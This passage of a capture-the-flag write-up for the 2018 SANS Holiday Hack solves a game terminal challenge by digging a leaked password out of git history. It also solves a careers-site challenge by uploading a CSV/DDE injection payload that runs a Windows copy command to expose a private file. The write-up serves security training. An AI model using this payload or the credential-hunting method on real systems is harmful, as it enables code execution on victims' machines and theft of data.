&lt;span class="go"&gt;                .&amp;#39;;:::::::::::cNMMo:::::::::::lc:::::::,.&lt;/span&gt;
&lt;span class="go"&gt;             .&amp;#39;::::::::::::::::col::::::::::::;:::::::::::,.&lt;/span&gt;
&lt;span class="go"&gt;                   .;:::,,,:::::::::::::::::;,,,:::::&amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;                .&amp;#39;::::::;;;:::::::::::dko:::::;::::::::;.&lt;/span&gt;
&lt;span class="go"&gt;             .,::::::::::::::::::::::lWMWc::::::::::::::::;.&lt;/span&gt;
&lt;span class="go"&gt;            ..:00:...;::::loc:::::::::coc::::::::::::&amp;#39;.;;.....&lt;/span&gt;
&lt;span class="go"&gt;              :NNl.,:::::xMMX:::::::::::::::::::::::::;,,.&lt;/span&gt;
&lt;span class="go"&gt;               .,::::::::cxxl::::,,,:::::::::::::::::::::;.&lt;/span&gt;
&lt;span class="go"&gt;            .,:::::::c:::::::::::;;;:::::::;;:::::kNXd::::::;.&lt;/span&gt;
&lt;span class="go"&gt;         .,::::::::cKMNo::::::::::::::::::;,,;::::xKKo:::::::::;.&lt;/span&gt;
&lt;span class="go"&gt;       .&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;,:::::x0Oc:::::::::oOOo:::::::::::::::::::::;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;            .,:::::::::::::::::::kWWk::::::::::::::ldl:::::;&amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;         .,::;,,::::::::::::::::::::::::::::::::::lMMMl:::::::;&amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;      .,:::::;,;:::::::::::::::::::::::::::::::::::ldl::::::::::::&amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;   .,::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::&amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;                               ..;;;;;;;;&amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;                             .&amp;#39;;;;;;;;;;;;;&amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;                          .&amp;#39;;;;;;;;;;;;;;;;;;;&amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;                         ........................&lt;/span&gt;



&lt;span class="go"&gt;Coalbox again, and I&amp;#39;ve got one more ask.&lt;/span&gt;
&lt;span class="go"&gt;Sparkle Q. Redberry has fumbled a task.&lt;/span&gt;
&lt;span class="go"&gt;Git pull and merging, she did all the day;&lt;/span&gt;
&lt;span class="go"&gt;With all this gitting, some creds got away.&lt;/span&gt;

&lt;span class="go"&gt;Urging - I scolded, &amp;quot;Don&amp;#39;t put creds in git!&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;She said, &amp;quot;Don&amp;#39;t worry - you&amp;#39;re having a fit.&lt;/span&gt;
&lt;span class="go"&gt;If I did drop them then surely I could,&lt;/span&gt;
&lt;span class="go"&gt;Upload some new code done up as one should.&amp;quot;&lt;/span&gt;

&lt;span class="go"&gt;Though I would like to believe this here elf,&lt;/span&gt;
&lt;span class="go"&gt;I&amp;#39;m worried we&amp;#39;ve put some creds on a shelf.&lt;/span&gt;
&lt;span class="go"&gt;Any who&amp;#39;s curious might find our &amp;quot;oops,&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;Please find it fast before some other snoops!&lt;/span&gt;

&lt;span class="go"&gt;Find Sparkle&amp;#39;s password, then run the runtoanswer tool.&lt;/span&gt;
&lt;span class="gp"&gt;elf@fa3b5d8290f0:~$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's see the git repository and check the commit history:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@76d904959962:~$&lt;/span&gt; ls -lh
&lt;span class="go"&gt;total 5.7M&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x 1 elf elf 4.0K Nov 14 09:48 kcconfmgmt&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 elf elf 5.7M Dec 14 16:13 runtoanswer&lt;/span&gt;
&lt;span class="gp"&gt;elf@76d904959962:~$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; kcconfmgmt/
&lt;span class="gp"&gt;elf@76d904959962:~/kcconfmgmt$&lt;/span&gt; git log &lt;span class="p"&gt;|&lt;/span&gt; grep -i -C &lt;span class="m"&gt;5&lt;/span&gt; password

&lt;span class="go"&gt;commit d84b728c7d9cf7f9bafc5efb9978cd0e3122283d&lt;/span&gt;
&lt;span class="go"&gt;Author: Sparkle Redberry &amp;lt;sredberry@kringlecon.com&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;Date:   Sat Nov 10 19:51:52 2018 -0500&lt;/span&gt;

&lt;span class="go"&gt;    Add user model for authentication, bcrypt password storage&lt;/span&gt;

&lt;span class="go"&gt;commit c27135005753f6dde3511a7e70eb27f92f67393f&lt;/span&gt;
&lt;span class="go"&gt;Author: Sparkle Redberry &amp;lt;sredberry@kringlecon.com&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;Date:   Sat Nov 10 08:11:40 2018 -0500&lt;/span&gt;

&lt;span class="go"&gt;--&lt;/span&gt;

&lt;span class="go"&gt;commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b&lt;/span&gt;
&lt;span class="go"&gt;Author: Sparkle Redberry &amp;lt;sredberry@kringlecon.com&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;Date:   Thu Nov 8 21:11:03 2018 -0500&lt;/span&gt;

&lt;span class="hll"&gt;&lt;span class="go"&gt;    Per @tcoalbox admonishment, removed username/password from config.js, default settings in config.js.def need to be updated before use&lt;/span&gt;
&lt;/span&gt;
&lt;span class="go"&gt;commit b2376f4a93ca1889ba7d947c2d14be9a5d138802&lt;/span&gt;
&lt;span class="go"&gt;Author: Sparkle Redberry &amp;lt;sredberry@kringlecon.com&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;Date:   Thu Nov 8 13:25:32 2018 -0500&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Apparently, in commit &lt;code&gt;60a2ffea7520ee980a5fc60177ff4d0633f2516b&lt;/code&gt;, Sparkle
removed her password from the &lt;code&gt;config.js&lt;/code&gt; file, which was replaced by a
default &lt;code&gt;config.js.def&lt;/code&gt;. Let's see where this file is:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@76d904959962:~/kcconfmgmt$&lt;/span&gt; find . -name config.js.def
&lt;span class="go"&gt;./server/config/config.js.def&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now that we know where it is, we can guess where the original &lt;code&gt;config.js&lt;/code&gt;
file was. Let's check it's modification history:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@eba657fc7961:~/kcconfmgmt$&lt;/span&gt; git log -p -- ./server/config/config.js
&lt;span class="go"&gt;commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b&lt;/span&gt;
&lt;span class="go"&gt;Author: Sparkle Redberry &amp;lt;sredberry@kringlecon.com&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;Date:   Thu Nov 8 21:11:03 2018 -0500&lt;/span&gt;
&lt;span class="go"&gt;    Per @tcoalbox admonishment, removed username/password from config.js, default settings in c&lt;/span&gt;
&lt;span class="go"&gt;onfig.js.def need to be updated before use&lt;/span&gt;
&lt;span class="go"&gt;diff --git a/server/config/config.js b/server/config/config.js&lt;/span&gt;
&lt;span class="go"&gt;deleted file mode 100644&lt;/span&gt;
&lt;span class="go"&gt;index 25be269..0000000&lt;/span&gt;
&lt;span class="go"&gt;--- a/server/config/config.js&lt;/span&gt;
&lt;span class="go"&gt;+++ /dev/null&lt;/span&gt;
&lt;span class="go"&gt;@@ -1,4 +0,0 @@&lt;/span&gt;
&lt;span class="go"&gt;-// Database URL&lt;/span&gt;
&lt;span class="go"&gt;-module.exports = {&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;-    &amp;#39;url&amp;#39; : &amp;#39;mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;-};&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We find our commit &lt;code&gt;60a2ffea7520ee980a5fc60177ff4d0633f2516b&lt;/code&gt;, which
deletes the file, and gives us the content of the original &lt;code&gt;config.js&lt;/code&gt;
file. Sparkle's password is &lt;code&gt;twinkletwinkletwinkle&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@fa3b5d8290f0:~$&lt;/span&gt; ./runtoanswer
&lt;span class="go"&gt;Loading, please wait......&lt;/span&gt;



&lt;span class="hll"&gt;&lt;span class="go"&gt;Enter Sparkle Redberry&amp;#39;s password: twinkletwinkletwinkle&lt;/span&gt;
&lt;/span&gt;

&lt;span class="go"&gt;This ain&amp;#39;t &amp;quot;I told you so&amp;quot; time, but it&amp;#39;s true:&lt;/span&gt;
&lt;span class="go"&gt;I shake my head at the goofs we go through.&lt;/span&gt;
&lt;span class="go"&gt;Everyone knows that the gits aren&amp;#39;t the place;&lt;/span&gt;
&lt;span class="go"&gt;Store your credentials in some safer space.&lt;/span&gt;

&lt;span class="go"&gt;Congratulations!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="elf-infosec-careers-website"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id32"&gt;Elf InfoSec Careers Website&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We're asked to take a look at the &lt;a class="reference external" href="https://careers.kringlecastle.com/"&gt;Elf InfoSec Careers website&lt;/a&gt;. It's a website where you can upload
your application, and if your profile is interesting enough, you can join
Santa's elves! The goal is to get the content of the
&lt;code&gt;C:\candidate_evaluation.docx&lt;/code&gt; file.&lt;/p&gt;
&lt;p&gt;Let's fill an application. You must provide your full name, phone number,
email address, and a CSV file with your work history:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/api/upload/application&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;careers.kringlecastle.com&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;*/*&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;https://careers.kringlecastle.com/&lt;/span&gt;
&lt;span class="na"&gt;X-Requested-With&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;XMLHttpRequest&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;multipart/form-data; boundary=---------------------------1284099169763381272238033&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;683&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;

-----------------------------1284099169763381272238033
Content-Disposition: form-data; name=&amp;quot;firstname&amp;quot;

Foo
-----------------------------1284099169763381272238033
Content-Disposition: form-data; name=&amp;quot;lastname&amp;quot;

Bar
-----------------------------1284099169763381272238033
Content-Disposition: form-data; name=&amp;quot;phone&amp;quot;

0000000000
-----------------------------1284099169763381272238033
Content-Disposition: form-data; name=&amp;quot;email&amp;quot;

foo@bar.com
-----------------------------1284099169763381272238033
Content-Disposition: form-data; name=&amp;quot;csv&amp;quot;; filename=&amp;quot;resume.csv&amp;quot;
Content-Type: text/csv

Super pentester

-----------------------------1284099169763381272238033--
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.14.1&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 03 Jan 2019 16:18:04 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=utf-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;X-Powered-By&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Express&lt;/span&gt;
&lt;span class="na"&gt;ETag&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;W/&amp;quot;172-gwRZ+l3Bn2+yGvHpphldazlOPqI&amp;quot;&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;370&lt;/span&gt;

Thank you for taking the time to upload your information to our elf resources shared workshop station! Our elf resources will review your CSV work history within the next few minutes to see if you qualify to join our elite team of InfoSec Elves. If you are accepted, you will be added to our secret list of potential new elf hires located in C:\candidate_evaluation.docx
&lt;/pre&gt;&lt;/div&gt;
&lt;img alt="career_upload.png" class="align-center" src="/images/sans-christmas-challenge-2018/career_upload.png" /&gt;
&lt;p&gt;I first thought that we'd have to perform an upload vulnerability, where we
could upload a webshell and gain remote code execution on the server. I tried
looking for an upload directory, for example in &lt;code&gt;/uploads/&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/uploads/&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;careers.kringlecastle.com&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.14.1&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 03 Jan 2019 16:23:08 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;X-Powered-By&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Express&lt;/span&gt;
&lt;span class="na"&gt;Cache-Control&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;public, max-age=0&lt;/span&gt;
&lt;span class="na"&gt;Last-Modified&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Fri, 07 Dec 2018 01:34:04 GMT&lt;/span&gt;
&lt;span class="na"&gt;ETag&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;W/&amp;quot;f48-167864ce0e2&amp;quot;&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;3912&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
[snip]
  &lt;span class="c"&gt;&amp;lt;!--physical server path---&amp;gt;&lt;/span&gt;
   &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Publicly accessible file served from: &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
     C:\careerportal\resources\public\    not found......&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
     &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
   &lt;span class="c"&gt;&amp;lt;!---logical web path--&amp;gt;&lt;/span&gt;
     &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;strong&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Try: &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; https://careers.kringlecastle.com/public/&amp;#39;file name you are looking for&amp;#39;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;strong&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;


&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;img alt="career_404.png" class="align-center" src="/images/sans-christmas-challenge-2018/career_404.png" /&gt;
&lt;p&gt;Hmm, what a helpful 404 error message. It gives us the full path to the public
web folder, and the URL. This means, that if we can get the
&lt;code&gt;C:\candidate_evaluation.docx&lt;/code&gt; in this directory, we'll be able to
download it. But how can we do so with only what we have in the application
form?&lt;/p&gt;
&lt;p&gt;The work history file that we upload is a CSV file. And apparently, this server
is a Windows server, given the file paths, and all. This means that the CSV
file will probably be opened by an elf using Excel. In that case, we can use
a &lt;a class="reference external" href="https://www.contextis.com/en/blog/comma-separated-vulnerabilities"&gt;CSV injection&lt;/a&gt; to
execute code on the elf's workstation. This is a vulnerability we sometimes
find during pentest assessments. However, it's pretty low risk, because it's
kind of clunky to exploit: the user has to download the CSV, try to evaluate
the cell with our payload, and click &amp;quot;Yes&amp;quot; on a warning prompt. It's still
worth a try, though:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat copy_file_to_www.csv
&lt;span class="go"&gt;=cmd|&amp;#39; /c copy C:\candidate_evaluation.docx C:\careerportal\resources\public\omg_secret_file.docx&amp;#39;!A0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This payload will copy the wanted file in the public web folder, under the
name &lt;code&gt;omg_secret_file.docx&lt;/code&gt;. Let's upload it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/api/upload/application&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;careers.kringlecastle.com&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;*/*&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;https://careers.kringlecastle.com/&lt;/span&gt;
&lt;span class="na"&gt;X-Requested-With&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;XMLHttpRequest&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;multipart/form-data; boundary=---------------------------12548806719497856202051334912&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;803&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;

-----------------------------12548806719497856202051334912
Content-Disposition: form-data; name=&amp;quot;firstname&amp;quot;

Foo
-----------------------------12548806719497856202051334912
Content-Disposition: form-data; name=&amp;quot;lastname&amp;quot;

Bar
-----------------------------12548806719497856202051334912
Content-Disposition: form-data; name=&amp;quot;phone&amp;quot;

0000000000
-----------------------------12548806719497856202051334912
Content-Disposition: form-data; name=&amp;quot;email&amp;quot;

foo@bar.com
-----------------------------12548806719497856202051334912
Content-Disposition: form-data; name=&amp;quot;csv&amp;quot;; filename=&amp;quot;copy_file_to_www.csv&amp;quot;
Content-Type: text/csv

=cmd|&amp;#39; /c copy C:\candidate_evaluation.docx C:\careerportal\resources\public\omg_secret_file.docx&amp;#39;!A0

-----------------------------12548806719497856202051334912--
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We wait a couple seconds, and then bingo! We can download the file from the
URL &lt;a class="reference external" href="https://careers.kringlecastle.com/public/omg_secret_file.docx"&gt;https://careers.kringlecastle.com/public/omg_secret_file.docx&lt;/a&gt;. You can
download this file &lt;a class="reference external" href="/docs/sans-christmas-challenge-2018/candidate_evaluation.docx"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now, we were asked to find which terrorist organization is supported by the
job applicant whose name begins with &amp;quot;K&amp;quot;. Let's open up the document:&lt;/p&gt;
&lt;img alt="career_candiate_docx.png" class="align-center" src="/images/sans-christmas-challenge-2018/career_candiate_docx.png" /&gt;
&lt;p&gt;Here's what we can learn on this applicant:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="underline"&gt;Candidate Name: Krampus&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Comments (Please summarize your perceptions of the candidate’s strengths,
and any concerns that should be considered:&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Krampus’s career summary included experience hardening decade old attack
vectors, and lacked updated skills to meet the challenges of attacks
against our beloved Holidays.&lt;/p&gt;
&lt;p&gt;Furthermore, there is intelligence from the North Pole &lt;strong&gt;this elf is linked
to cyber terrorist organization Fancy Beaver&lt;/strong&gt; who openly provides
technical support to the villains that attacked our Holidays last year.&lt;/p&gt;
&lt;p&gt;We owe it to Santa to find, recruit, and put forward trusted candidates
with the right skills and ethical character to meet the challenges that
threaten our joyous season.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So, apparently the candidate name is &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Krampus"&gt;Krampus&lt;/a&gt;, and he's linked to the terrorist
organization &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Fancy_Bear"&gt;Fancy Beaver&lt;/a&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="network-traffic-forensics"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id33"&gt;Network Traffic Forensics&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;We find Hans in Santa's secret room:&lt;/p&gt;
&lt;img alt="hans.png" class="align-center" src="/images/sans-christmas-challenge-2018/hans.png" /&gt;
&lt;p&gt;&lt;em&gt;Hans says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You’ve found me and blocked my access to Santa’s treasure.&lt;/p&gt;
&lt;p&gt;You’ve done well in foiling me. But, I’ve still got a chance.&lt;/p&gt;
&lt;p&gt;When you steal six hundred dollars, you can disappear. When you steal all
of Santa’s treasure, they will find you… unless….&lt;/p&gt;
&lt;p&gt;&lt;em&gt;(muffled yelling)&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img alt="hans_snow.png" class="align-center" src="/images/sans-christmas-challenge-2018/hans_snow.png" /&gt;
&lt;p&gt;&lt;em&gt;The narrator says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;And then suddenly, Hans slips and falls into a snowbank. His nefarious
plan thwarted, he's now just cold and wet.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;But Santa still has more questions for you to solve!&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img alt="santa.png" class="align-center" src="/images/sans-christmas-challenge-2018/santa.png" /&gt;
&lt;p&gt;&lt;em&gt;Santa says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;HO HO HO!!!&lt;/p&gt;
&lt;p&gt;You did a great job, but keep going!&lt;/p&gt;
&lt;p&gt;Solve all remaining objectives in your badge.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="section" id="sugarplum-mary-s-cranberry-pi-challenge"&gt;
